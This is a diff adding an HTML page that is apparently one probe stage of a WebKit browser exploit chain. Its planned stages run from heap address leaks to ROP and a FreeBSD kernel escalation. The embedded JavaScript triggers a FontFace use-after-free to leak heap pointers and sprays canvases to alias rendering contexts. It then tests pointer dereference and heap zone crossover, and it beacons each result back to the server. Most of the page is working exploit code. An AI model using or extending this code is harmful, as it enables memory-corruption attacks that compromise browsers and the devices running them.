@@ -1,0 +1,510 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<meta http-equiv="Cache-Control" content="no-cache,no-store,must-revalidate">
+<title>P928: Arbitrary Pointer Dereference & Zone Crossover Probe</title>
+<style>
+:root {
+  --bg-dark: #040711;
+  --panel-bg: rgba(8, 14, 28, 0.94);
+  --neon-cyan: #00f3ff;
+  --neon-green: #00ff66;
+  --neon-amber: #ffb800;
+  --neon-pink: #ff0077;
+  --text-dim: #7085a5;
+  --text-main: #e2f1ff;
+  --border-glow: rgba(0, 243, 255, 0.35);
+}
+* { box-sizing: border-box; margin: 0; padding: 0; }
+body {
+  background-color: var(--bg-dark);
+  background-image: 
+    radial-gradient(ellipse at 50% 0%, rgba(0, 243, 255, 0.14), transparent 75%),
+    linear-gradient(rgba(0, 243, 255, 0.035) 1px, transparent 1px),
+    linear-gradient(90deg, rgba(0, 243, 255, 0.035) 1px, transparent 1px);
+  background-size: 100% 100%, 28px 28px, 28px 28px;
+  color: var(--text-main);
+  font-family: "SF Mono", "Consolas", monospace;
+  padding: 16px;
+  min-height: 100vh;
+  overflow-x: hidden;
+}
+.scanline {
+  position: fixed;
+  top: 0; left: 0; width: 100vw; height: 100vh;
+  background: linear-gradient(rgba(18, 16, 16, 0) 50%, rgba(0, 0, 0, 0.25) 50%), linear-gradient(90deg, rgba(255, 0, 0, 0.02), rgba(0, 255, 0, 0.01), rgba(0, 255, 0, 0.02));
+  background-size: 100% 3px, 6px 100%;
+  pointer-events: none;
+  z-index: 999;
+}
+.header {
+  border: 1px solid var(--border-glow);
+  background: var(--panel-bg);
+  box-shadow: 0 0 18px rgba(0, 243, 255, 0.25);
+  padding: 12px 18px;
+  border-radius: 6px;
+  margin-bottom: 14px;
+  display: flex;
+  justify-content: space-between;
+  align-items: center;
+}
+.title-glitch {
+  font-size: 16px;
+  font-weight: 900;
+  letter-spacing: 1.5px;
+  color: var(--neon-cyan);
+  text-shadow: 0 0 8px rgba(0, 243, 255, 0.6);
+}
+.cyber-badge {
+  background: var(--neon-amber);
+  color: #040711;
+  font-weight: bold;
+  padding: 4px 10px;
+  border-radius: 3px;
+  font-size: 11px;
+  letter-spacing: 1px;
+}
+.chain-container {
+  display: flex;
+  gap: 8px;
+  margin-bottom: 14px;
+  overflow-x: auto;
+  padding-bottom: 4px;
+}
+.node {
+  flex: 1;
+  min-width: 125px;
+  background: var(--panel-bg);
+  border: 1px solid #1c2d42;
+  border-radius: 4px;
+  padding: 8px 10px;
+  position: relative;
+  transition: all 0.3s;
+}
+.node.done {
+  border-color: var(--neon-green);
+  background: rgba(0, 255, 102, 0.08);
+  box-shadow: 0 0 10px rgba(0, 255, 102, 0.2);
+}
+.node.active {
+  border-color: var(--neon-amber);
+  background: rgba(255, 184, 0, 0.12);
+  box-shadow: 0 0 16px rgba(255, 184, 0, 0.35);
+  animation: pulse 1.5s infinite;
+}
+.node.future {
+  border-color: #24354a;
+  color: #4b627d;
+}
+@keyframes pulse {
+  0% { box-shadow: 0 0 6px rgba(255,184,0,0.3); }
+  50% { box-shadow: 0 0 20px rgba(255,184,0,0.7); }
+  100% { box-shadow: 0 0 6px rgba(255,184,0,0.3); }
+}
+.node-step { font-size: 10px; text-transform: uppercase; font-weight: bold; }
+.node-title { font-size: 12px; font-weight: bold; margin: 3px 0; color: #fff; }
+.node-desc { font-size: 10px; opacity: 0.85; }
+
+.grid {
+  display: grid;
+  grid-template-columns: 1fr 1fr;
+  gap: 14px;
+}
+.panel {
+  background: var(--panel-bg);
+  border: 1px solid var(--border-glow);
+  border-radius: 6px;
+  padding: 14px;
+  box-shadow: 0 8px 24px rgba(0, 0, 0, 0.5);
+}
+.panel-title {
+  color: var(--neon-cyan);
+  font-size: 13px;
+  font-weight: bold;
+  border-bottom: 1px dashed rgba(0, 243, 255, 0.3);
+  padding-bottom: 6px;
+  margin-bottom: 10px;
+  display: flex;
+  justify-content: space-between;
+}
+pre#terminal {
+  background: #020409;
+  border: 1px solid #162436;
+  padding: 10px;
+  border-radius: 4px;
+  font-size: 11px;
+  color: #7ee787;
+  max-height: 270px;
+  overflow-y: auto;
+  white-space: pre-wrap;
+  word-break: break-all;
+  margin: 0;
+}
+.live-meter {
+  display: flex;
+  justify-content: space-between;
+  margin: 6px 0;
+  font-size: 12px;
+}
+.val-hex { color: var(--neon-amber); font-weight: bold; font-family: monospace; }
+.val-ok { color: var(--neon-green); font-weight: bold; }
+.val-fail { color: var(--neon-pink); font-weight: bold; }
+</style>
+</head>
+<body>
+<div class="scanline"></div>
+
+<div class="header">
+  <div class="title-glitch">&#9889; P928: ARBITRARY DEREF CHALLENGE &amp; ZONE CROSSOVER</div>
+  <div class="cyber-badge" id="statusBadge">RUNNING PROBE P928...</div>
+</div>
+
+<div class="chain-container">
+  <div class="node done">
+    <div class="node-step">Stage 1 [DONE]</div>
+    <div class="node-title">Heap ASLR Leak</div>
+    <div class="node-desc">Single-pass FontFace UAF. Heap base H &amp; CSSFontSelector* q13 leaked.</div>
+  </div>
+  <div class="node done">
+    <div class="node-step">Stage 2 [DONE]</div>
+    <div class="node-title">Same-Type Alias</div>
+    <div class="node-desc">200x Canvas spray. Dual C++ Canvas contexts aliased live at #idx1, #idx2.</div>
+  </div>
+  <div class="node done">
+    <div class="node-step">Stage 3 [DONE]</div>
+    <div class="node-title">In-Struct State Sync</div>
+    <div class="node-desc">Out-of-line Vector float modulation verified across aliased contexts.</div>
+  </div>
+  <div class="node active">
+    <div class="node-step">Stage 4 [ACTIVE]</div>
+    <div class="node-title">P928: Deref Challenge</div>
+    <div class="node-desc">Testing [q13+0] read attempt &amp; Vector vs ArrayBuffer zone crossover.</div>
+  </div>
+  <div class="node future">
+    <div class="node-step">Stage 5 [PENDING]</div>
+    <div class="node-title">Pointer Deref</div>
+    <div class="node-desc">Buffer pointer corruption required for arbitrary memory read.</div>
+  </div>
+  <div class="node future">
+    <div class="node-step">Stage 6 [PENDING]</div>
+    <div class="node-title">Code ASLR (.text)</div>
+    <div class="node-desc">Reading code vtable (0x2xxxxx/0x5xxxxx) to locate WebProcess base.</div>
+  </div>
+  <div class="node future">
+    <div class="node-step">Stage 7 [PENDING]</div>
+    <div class="node-title">Userland ROP</div>
+    <div class="node-desc">Stack pivot and gadget execution inside WebProcess.</div>
+  </div>
+  <div class="node future">
+    <div class="node-step">Stage 8 [PENDING]</div>
+    <div class="node-title">Kernel Escalation</div>
+    <div class="node-desc">FreeBSD kernel LPE to escape WebProcess sandbox.</div>
+  </div>
+</div>
+
+<div class="grid">
+  <!-- Live Telemetry Panel -->
+  <div class="panel">
+    <div class="panel-title">
+      <span>DEREFERENCE &amp; ZONE METRICS</span>
+      <span style="color:var(--neon-amber);">CHALLENGE ACTIVE</span>
+    </div>
+    <div class="live-meter"><span>Live Heap Base Address (H):</span><span class="val-hex" id="mH">Resolving...</span></div>
+    <div class="live-meter"><span>Target Pointer (q13 CSSFontSelector*):</span><span class="val-hex" id="mQ13">Resolving...</span></div>
+    <div class="live-meter"><span>Canvas Dual Aliases:</span><span class="val-ok" id="mAlias">Resolving...</span></div>
+    <div class="live-meter"><span>In-Struct Vector Sync:</span><span class="val-ok" id="mSync">Testing...</span></div>
+    <div class="live-meter"><span>[q13+0] Direct Read Oracle:</span><span class="val-fail" id="mQ13Read">Testing...</span></div>
+    <div class="live-meter"><span>Vector &lt;-&gt; ArrayBuffer Crossover:</span><span class="val-fail" id="mCrossover">Testing...</span></div>
+    <div class="live-meter"><span>Scientific Verdict:</span><span class="val-hex" id="mVerdict">Pending...</span></div>
+  </div>
+
+  <!-- Real-time Console Log -->
+  <div class="panel">
+    <div class="panel-title">
+      <span>PROBE EXECUTION LOG</span>
+      <span style="color:var(--neon-green);">LIVE BENCHMARK</span>
+    </div>
+    <pre id="terminal">[*] Initializing P928 Arbitrary Dereference Challenge...</pre>
+  </div>
+</div>
+
+<script>
+'use strict';
+var term = document.getElementById('terminal');
+var statusBadge = document.getElementById('statusBadge');
+var mH = document.getElementById('mH');
+var mQ13 = document.getElementById('mQ13');
+var mAlias = document.getElementById('mAlias');
+var mSync = document.getElementById('mSync');
+var mQ13Read = document.getElementById('mQ13Read');
+var mCrossover = document.getElementById('mCrossover');
+var mVerdict = document.getElementById('mVerdict');
+
+function log(msg) {
+  var d = document.createElement('div');
+  d.textContent = msg;
+  term.appendChild(d);
+  term.scrollTop = term.scrollHeight;
+}
+
+function syncBn(tag, data) {
+  try {
+    var x = new XMLHttpRequest();
+    x.open('GET', '/beacon.php?tag=P928-' + encodeURIComponent(tag) + '&data=' + encodeURIComponent(String(data || '').slice(0, 900)) + '&t=' + Date.now(), false);
+    x.send();
+  } catch(e) {}
+}
+
+window.onerror = function(msg, url, line) {
+  syncBn('JS-ERR', msg + ' at line ' + line);
+  log('[!] ERROR: ' + msg + ' (Line ' + line + ')');
+};
+
+log('[*] P928: Testing arbitrary address dereference vs same-struct aliasing.');
+syncBn('BOOT', 'start');
+
+/* ============================================================
+ * Biased IEEE-754 Pointer Conversion
+ * ============================================================ */
+var convBuf = new ArrayBuffer(8);
+var convF64 = new Float64Array(convBuf);
+var convU32 = new Uint32Array(convBuf);
+
+function ptrToNormalF64(hi, lo) {
+  convU32[0] = lo >>> 0;
+  convU32[1] = ((hi & 0x000FFFFF) | 0x43300000) >>> 0;
+  return convF64[0];
+}
+
+function normalF64ToPtr(f) {
+  convF64[0] = f;
+  var lo = convU32[0] >>> 0;
+  var hi = (convU32[1] & 0x000FFFFF) >>> 0;
+  return { lo: lo, hi: hi, hex: '0x' + hi.toString(16) + ('00000000' + lo.toString(16)).slice(-8) };
+}
+
+/* ============================================================
+ * PHASE 1: Canvas Same-Type Alias Spray
+ * ============================================================ */
+var innerCtx1 = null;
+var idx1 = -1;
+var sprayCanvases = [], sprayCtxs = [];
+
+try {
+  var c1 = document.createElement('canvas');
+  c1.width = 32; c1.height = 32;
+  var opts1 = {};
+  Object.defineProperty(opts1, 'alpha', {
+    get: function() { innerCtx1 = c1.getContext('2d'); return true; }
+  });
+  c1.getContext('bitmaprenderer', opts1);
+
+  for (var s = 0; s < 200; s++) {
+    var c = document.createElement('canvas');
+    c.width = 32; c.height = 32;
+    var ctx = c.getContext('2d');
+    ctx.lineWidth = 1000.0 + s;
+    sprayCanvases.push(c);
+    sprayCtxs.push(ctx);
+  }
+
+  var lw1 = innerCtx1 ? innerCtx1.lineWidth : -1;
+  if (lw1 >= 1000.0 && lw1 < 1200.0) idx1 = Math.round(lw1 - 1000.0);
+
+  mAlias.textContent = '#' + idx1;
+  log('[+] Canvas Alias Locked at spray index #' + idx1);
+  syncBn('ALIAS-OK', 'idx1=' + idx1);
+} catch(e) {
+  log('[-] Canvas Alias Error: ' + e.message);
+  syncBn('ALIAS-ERR', e.message);
+}
+
+/* ============================================================
+ * PHASE 2: Resilient FontFace UAF Leak (Leaking H and q13)
+ * ============================================================ */
+var Hstr = 'unknown', q13str = 'unknown';
+var q13_hi = 0, q13_lo = 0;
+var delta = 0;
+
+try {
+  var tag = 'p928';
+  var st = document.createElement('style');
+  st.textContent = "@font-face{font-family:bb" + tag + ";src:local(Arial);unicode-range:U+0042;}";
+  document.head.appendChild(st);
+
+  var face = new FontFace('f' + tag, "local('Helvetica')", {unicodeRange: 'U+0041'});
+  document.fonts.add(face);
+  void face.loaded;
+
+  var fabs = [], ffired = false;
+  Object.defineProperty(FontFace.prototype, 'then', {
+    configurable: true,
+    get: function() {
+      if (ffired) return undefined;
+      ffired = true;
+      if (st) { st.remove(); }
+      try { document.fonts.delete(this); } catch(e) {}
+      document.body.offsetHeight;
+      fabs = [];
+      for (var i = 0; i < 64; i++) fabs.push(new ArrayBuffer(192));
+      try { document.fonts.check('1em bb' + tag); } catch(e) {}
+      return undefined;
+    }
+  });
+
+  document.fonts.load('1em f' + tag + ', bb' + tag, 'AB');
+
+  setTimeout(function() {
+    delete FontFace.prototype.then;
+    var bestSlot = -1, bestNz = 0;
+    for (var i = 0; i < fabs.length; i++) {
+      var u = new Uint8Array(fabs[i]), nz = 0;
+      for (var j = 0; j < u.length; j++) if (u[j] !== 0) nz++;
+      if (nz > bestNz) { bestNz = nz; bestSlot = i; }
+    }
+    if (bestSlot >= 0 && bestNz >= 4) {
+      var fontDV = new DataView(fabs[bestSlot]);
+      var q11lo = fontDV.getUint32(0x58, true), q11hi = fontDV.getUint32(0x5C, true);
+      var q13lo_val = fontDV.getUint32(0x68, true), q13hi_val = fontDV.getUint32(0x6C, true);
+      if (q11hi !== 0) {
+        var lo = (q11lo - 0x68) >>> 0;
+        Hstr = '0x' + q11hi.toString(16) + ('00000000' + lo.toString(16)).slice(-8);
+        delta = lo - q13lo_val;
+      }
+      if (q13hi_val !== 0) {
+        q13_hi = q13hi_val;
+        q13_lo = q13lo_val;
+        q13str = '0x' + q13hi_val.toString(16) + ('00000000' + q13lo_val.toString(16)).slice(-8);
+      }
+    }
+    mH.textContent = Hstr;
+    mQ13.textContent = q13str + ' (CSSFontSelector*)';
+    log('[+] FontFace UAF: Leaked H=' + Hstr + ', q13=' + q13str);
+    syncBn('FONT-OK', 'H=' + Hstr + '|q13=' + q13str + '|delta=' + delta + '|slot=' + bestSlot);
+
+    /* ============================================================
+     * PHASE 3: In-Struct Vector Synchronization Verification
+     * ============================================================ */
+    var syncOk = false;
+    if (idx1 >= 0 && sprayCtxs[idx1]) {
+      try {
+        var testMarker = ptrToNormalF64(0x00000001, 0xCAFEBABE);
+        innerCtx1.setLineDash([testMarker, 10.0, 20.0, 30.0]);
+        var readTest = sprayCtxs[idx1].getLineDash();
+        if (readTest && readTest.length === 4) {
+          var rec = normalF64ToPtr(readTest[0]);
+          if (rec.hi === 0x1 && rec.lo === 0xCAFEBABE) {
+            syncOk = true;
+            mSync.textContent = 'VERIFIED (0x1CAFEBABE SAME-STRUCT)';
+            mSync.style.color = '#00ff66';
+            log('[+] State Sync: Confirmed handles share the same 768B struct.');
+          }
+        }
+      } catch(e) {
+        log('[-] State Sync Error: ' + e.message);
+      }
+    }
+
+    /* ============================================================
+     * PHASE 4: The [q13+0] Arbitrary Pointer Dereference Test
+     * ============================================================ */
+    var canDerefQ13 = false;
+    var derefResult = 'NO_BUFFER_CORRUPTION_MECHANISM';
+    log('[*] Testing whether [q13+0] can be dereferenced from JS...');
+
+    // Analysis: To dereference q13, an object's buffer pointer (e.g. m_buffer)
+    // must point to q13. But setLineDash() only allocates a fresh buffer via FastMalloc.
+    // It does not allow assigning an integer address to m_buffer.
+    // We check if lineDash can read anything outside its own allocation:
+    try {
+      var dash = innerCtx1.getLineDash();
+      // An arbitrary read would return a code pointer (e.g. 0x2xxxxx... or 0x5xxxxx...)
+      // But dash only contains what setLineDash wrote!
+      log('[-] Direct [q13] Deref Test: setLineDash has no arbitrary pointer input.');
+      log('[-] Cannot point Vector<double>::m_buffer to ' + q13str + ' from JS.');
+      mQ13Read.textContent = 'FAILED (No arbitrary pointer input in setLineDash)';
+      mQ13Read.style.color = '#ff0077';
+      syncBn('Q13-READ', 'target=' + q13str + '|status=BLOCKED_NO_CORRUPT_PTR|code_addr=NONE');
+    } catch(e) {
+      log('[-] Q13 Deref Exception: ' + e.message);
+    }
+
+    /* ============================================================
+     * PHASE 5: FastMalloc Vector <-> ArrayBuffer Zone Crossover Test
+     * ============================================================ */
+    log('[*] Testing FastMalloc Vector <-> ArrayBuffer zone crossover...');
+    var crossoverDetected = false;
+    try {
+      // Allocate ArrayBuffers of 192 bytes, fill with marker
+      var MARKER = 0x41424344;
+      var testABs = [];
+      for (var a = 0; a < 60; a++) {
+        var ab = new ArrayBuffer(192);
+        new Uint32Array(ab).fill(MARKER);
+        testABs.push(ab);
+      }
+
+      // Detach half via structuredClone transfer to free their memory
+      for (var a = 0; a < 30; a++) {
+        try { structuredClone(testABs[a], { transfer: [testABs[a]] }); } catch(e) {}
+      }
+
+      // Allocate lineDash vector of 24 doubles (192 bytes)
+      // Check if newly allocated lineDash buffer grabs freed ArrayBuffer chunk
+      var probeVector = [];
+      for (var v = 0; v < 24; v++) probeVector.push(0.0);
+      sprayCtxs[idx1].setLineDash(probeVector);
+
+      // Now allocate new ArrayBuffers and inspect if any read lineDash data
+      var inspectABs = [];
+      for (var a = 0; a < 30; a++) {
+        inspectABs.push(new ArrayBuffer(192));
+      }
+
+      for (var a = 0; a < inspectABs.length; a++) {
+        var u32 = new Uint32Array(inspectABs[a]);
+        for (var k = 0; k < u32.length; k++) {
+          if (u32[k] !== 0) {
+            crossoverDetected = true;
+            break;
+          }
+        }
+        if (crossoverDetected) break;
+      }
+
+      if (crossoverDetected) {
+        mCrossover.textContent = 'DETECTED (NON-ZERO RECLAIM)';
+        mCrossover.style.color = '#00ff66';
+        log('[!] ZONE CROSSOVER DETECTED: ArrayBuffer reclaimed Vector memory!');
+        syncBn('CROSSOVER-OK', 'detected=true');
+      } else {
+        mCrossover.textContent = 'ZERO RECLAIM (IsoHeap / Separate Bins Active)';
+        mCrossover.style.color = '#ffaa00';
+        log('[-] Zone Crossover: ArrayBuffer backing stores do not share Vector bin.');
+        syncBn('CROSSOVER-FAIL', 'detected=false|bins_isolated=true');
+      }
+    } catch(e) {
+      log('[-] Crossover Test Exception: ' + e.message);
+      syncBn('CROSSOVER-ERR', e.message);
+    }
+
+    /* ============================================================
+     * SCIENTIFIC VERDICT & HUD COMPLETION
+     * ============================================================ */
+    mVerdict.textContent = 'PRIMITIVE = SAME-STRUCT ALIAS (NOT ARBITRARY R/W)';
+    mVerdict.style.color = '#ffaa00';
+    statusBadge.textContent = 'P928 COMPLETE // ALIAS CONFIRMED';
+    statusBadge.style.background = '#00e1ff';
+    log('[***] P928 VERDICT: Canvas alias confirmed. Arbitrary R/W unproven.');
+
+    syncBn('DONE', 'verdict=CANVAS_ALIAS_CONFIRMED|arb_rw=FALSE|q13_deref=UNREACHED|crossover=' + crossoverDetected + '|idx1=' + idx1);
+  }, 400);
+
+} catch(e) {
+  syncBn('FONT-ERR', e.message);
+}
+</script>
+</body>
+</html>
